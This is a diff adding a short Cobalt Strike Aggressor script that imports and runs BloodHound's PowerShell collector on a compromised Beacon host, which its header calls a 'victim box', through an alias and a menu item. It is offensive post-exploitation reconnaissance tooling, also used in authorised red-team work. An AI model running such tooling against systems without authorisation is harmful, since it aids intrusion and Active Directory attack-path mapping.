@@ -1,0 +1,24 @@
+# This Aggressor script will add bindings to import and run BloodHound on a victim box.
+
+# Run BloodHound with default settings
+sub bloodhound {
+    bpowershell_import($1, script_resource("scripts/BloodHound.ps1")); # Change path to suit
+    bpowershell($1, "Invoke-BloodHound");
+}
+
+# Alias to run BloodHound from Beacon quickly
+alias bloodhound {
+    bloodhound($1);
+}
+
+# Add BloodHound bindings to Beacon menu
+popup beacon_bottom {
+    menu "Powershell" {
+        item "BloodHound" {
+            local('$bid');
+            foreach $bid ($1) {
+                bloodhound ($1);
+            }
+        }
+    }
+}
